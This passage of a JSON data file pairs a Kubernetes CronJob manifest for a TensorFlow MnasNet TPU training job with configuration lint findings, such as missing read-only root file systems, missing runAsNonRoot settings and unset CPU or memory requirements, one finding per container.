cloud-tpus.google.com/preemptible-v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-mnasnet-func-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"train\" does not have a read-only root file system"
  },
  {
    "id": "01349",
    "manifest_path": "data/manifests/the_stack_sample/sample_0420.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-mnasnet-func-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/mnasnet/mnasnet_main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --config_file=/tpu/models/official/mnasnet/configs/cloud/v3-32.yaml\n          - --train_steps=1000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-mnasnet-func-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"monitor\" is not set to runAsNonRoot"
  },
  {
    "id": "01350",
    "manifest_path": "data/manifests/the_stack_sample/sample_0420.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-mnasnet-func-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/mnasnet/mnasnet_main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --config_file=/tpu/models/official/mnasnet/configs/cloud/v3-32.yaml\n          - --train_steps=1000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-mnasnet-func-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"publisher\" is not set to runAsNonRoot"
  },
  {
    "id": "01351",
    "manifest_path": "data/manifests/the_stack_sample/sample_0420.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-mnasnet-func-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/mnasnet/mnasnet_main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --config_file=/tpu/models/official/mnasnet/configs/cloud/v3-32.yaml\n          - --train_steps=1000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-mnasnet-func-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"train\" is not set to runAsNonRoot"
  },
  {
    "id": "01352",
    "manifest_path": "data/manifests/the_stack_sample/sample_0420.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-mnasnet-func-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/mnasnet/mnasnet_main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --config_file=/tpu/models/official/mnasnet/configs/cloud/v3-32.yaml\n          - --train_steps=1000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-mnasnet-func-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"monitor\" has cpu request 0"
  },
  {
    "id": "01353",
    "manifest_path": "data/manifests/the_stack_sample/sample_0420.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-mnasnet-func-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/mnasnet/mnasnet_main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --config_file=/tpu/models/official/mnasnet/configs/cloud/v3-32.yaml\n          - --train_steps=1000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-mnasnet-func-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"publisher\" has cpu request 0"
  },
  {
    "id": "01354",
    "manifest_path": "data/manifests/the_stack_sample/sample_0420.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-mnasnet-func-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/mnasnet/mnasnet_main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --config_file=/tpu/models/official/mnasnet/configs/cloud/v3-32.yaml\n          - --train_steps=1000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-mnasnet-func-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"train\" has cpu request 0"
  },
  {
    "id": "01355",
    "manifest_path": "data/manifests/the_stack_sample/sample_0420.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-mnasnet-func-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/mnasnet/mnasnet_main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --config_file=/tpu/models/official/mnasnet/configs/cloud/v3-32.yaml\n          - --train_steps=1000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-mnasnet-func-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"monitor\" has memory limit 0"
  },
  {
    "id": "01356",
    "manifest_path": "data/manifests/the_stack_sample/sample_0420.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-mnasnet-func-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/mnasnet/mnasnet_main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --config_file=/tpu/models/official/mnasnet/configs/cloud/v3-32.yaml\n          - --train_steps=1000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow-tpu-1x:r1.15.4\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 32\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-r1.15.4/mnasnet/func/v3-32/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"total_wall_time\\\": {\\n\\\n              \\    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n     \\\"\\\n              stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-r1.15.4-mnasnet-func-v3-32\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"publisher\" has memory limit 0"
  },
  {
    "id": "01357",
    "manifest_path": "data/manifests/the_stack_sample/sample_0420.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-r1.15.4-mnasnet-func-v3-32\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: 1.15.4\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - /tpu/models/official/mnasnet/mnasnet_main.py\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --iterations_per_loop=1000\n          - --mode=train\n          - --data_dir=$(IMAGENET_DIR)\n          - --model_dir=$(MODEL_DIR)\n          - --config_file=/tpu/models/official/mnasnet/configs/cloud/v3-32.yaml\n          - --train_steps=1000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              